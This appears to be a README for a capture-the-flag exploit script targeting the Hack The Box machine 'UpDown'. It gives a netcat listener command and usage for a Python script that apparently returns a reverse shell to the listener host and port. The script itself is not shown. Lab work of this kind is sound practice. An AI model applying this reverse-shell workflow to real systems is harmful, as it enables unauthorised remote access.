# Exploit Script for HTB UpDown
Set up a listener:
```
nc -lvnp <lport>
```
Run the scipt:
```
python3 updown.py <lhost> <lport>
```
<img width="1107" height="708" alt="image" src="https://github.com/user-attachments/assets/fc02b5a5-c538-459e-ac39-8ec8197ec6e4" />


---
```
python3 updown.py -h
usage: updown.py [-h] ip port

UpDown Exploit

positional arguments:
  ip          Listener IP (tun0)
  port        Listener Port

options:
  -h, --help  show this help message and exit
```
